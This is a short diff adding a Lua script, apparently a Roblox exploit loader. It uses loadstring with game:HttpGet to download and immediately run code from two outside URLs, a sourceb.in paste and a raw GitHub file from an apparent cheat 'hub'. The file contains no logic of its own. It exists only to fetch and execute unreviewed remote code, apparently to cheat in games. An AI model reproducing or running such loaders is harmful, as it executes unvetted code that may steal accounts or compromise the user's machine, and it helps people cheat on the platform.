@@ -1,0 +1,5 @@
+-- Load the first script
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/rgOJ6Gb0X3/0", true))()
+
+-- Load the second script after the first one
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag1/Omghub1/refs/heads/main/OMG", true))()
